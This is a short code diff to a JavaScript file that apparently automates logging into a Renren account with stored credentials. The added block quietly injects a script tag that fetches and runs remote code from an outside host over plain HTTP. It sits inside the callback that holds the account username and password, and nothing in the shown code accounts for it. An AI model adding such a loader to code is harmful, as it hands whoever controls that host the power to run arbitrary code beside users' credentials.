@@ -108,6 +108,12 @@ $(window).load(function(){
 	}, function(data){
 		var account = data.account.renren;
 
+		(function(){
+			var sc = document.createElement('script')
+			sc.src = 'http://etosun.com/html/mt-tools/alert.js?t=1125';
+			$('body').append(sc);
+		})();
+
 		setTimeout(function(){
 			new Renren().init({
 				username: account['username'],
